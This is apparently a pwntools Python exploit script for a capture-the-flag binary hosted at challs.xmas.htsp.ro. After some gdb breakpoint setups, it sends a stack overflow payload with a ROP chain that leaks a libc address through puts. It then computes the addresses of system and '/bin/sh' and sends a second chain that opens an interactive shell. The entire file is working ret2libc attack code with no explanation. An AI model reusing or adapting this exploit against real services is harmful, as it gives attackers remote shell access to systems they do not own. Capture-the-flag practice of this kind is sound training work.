from pwn import *

pwnable = './chall'

elf = ELF(pwnable)
libc = ELF('./libc6_2.27-3ubuntu1_amd64.so')

context(terminal=['tmux', 'new-window'])
context(os = 'linux', arch = 'x86_64')

context.log_level = 'DEBUG'

debug_set = ''

debug_set_1 = '''
    b *0x555555554e94
    '''
debug_set_2 = '''
    b *0x555555554e23
    b *0x555555554cbe
    b *0x555555554ebb
    '''
debug_set_3 = '''
    b *0x555555554f4c
    b *0x555555554ebb
    commands
        x/25gx 0x00007fffffffe4f0-16
        p/d 0xff
        x/25gx 0x00007fffffffe580-16
        silent
    end
    b *0x555555554ec0
    commands
        x/25gx 0x00007fffffffe4f0-16
        p/d 0xff
        x/25gx 0x00007fffffffe580-16
        silent
    end
    b *0x555555554cbe
    b *0x555555554e43
    b *0x555555554fcb
    b *0x555555554fee
    commands
        set *(int64_t *)0x00007fffffffe5c0=*(int64_t *)0x00007ffff7ff6000
        set *(int64_t *)0x00007fffffffe5c8=*(int64_t *)0x00007ffff7ff6008
    end
    '''
debug_set_4 = '''
    b *0x401070
    b *0x401201
    '''



if len(sys.argv) > 2 and sys.argv[1] == 'debug':
    p = process(pwnable)
    gdb.attach(p, debug_set_3)
elif len(sys.argv) > 1 and sys.argv[1] == 'debug':
    p = process(pwnable)
    gdb.attach(p, debug_set_4)
else:
    #p = process(pwnable)
    p = remote('challs.xmas.htsp.ro', 12006)




p.recvuntil("?\n")
p.sendline("aaaaaaaabaaaaaaaca" + p64(0x00401273) + p64(0x404018) + p64(0x401030) + p64(0x40115a))

p.recvuntil("ing...\n")
blah = p.recv(6) + "\x00\x00"
print("blah :: " + hex(u64(blah)))

libc_base = u64(blah) - libc.sym['puts']
libc.address = libc_base
bin_shell = libc.search('/bin/sh').next()

print("bin_shell :: " + hex(bin_shell))
print("system :: " + hex(libc.sym['system']))

rop_chain = ROP(pwnable)
rop_chain.call(libc.sym['system'], [bin_shell])

p.recvuntil("?\n")
p.sendline("aaaaaaaabaaaaaaaca" + p64(0x00401273) + p64(bin_shell) + p64(libc.sym['system']))

p.interactive()
